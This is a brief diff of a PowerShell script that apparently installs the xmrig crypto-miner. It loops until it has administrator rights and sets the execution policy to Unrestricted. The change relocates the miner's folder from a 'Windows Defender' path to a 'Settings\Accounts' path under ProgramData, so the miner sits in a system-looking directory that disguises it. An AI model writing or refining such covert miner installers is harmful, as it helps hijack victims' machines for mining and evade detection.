@@ -13,7 +13,7 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
-$confirm = "C:\ProgramData\Microsoft\Windows Defender"
+$confirm = "C:\ProgramData\Microsoft\Settings\Accounts"
 $minerHome = "$confirm\xmrig-6.22.2"
 $minerBinary = "xmrig.exe"
 
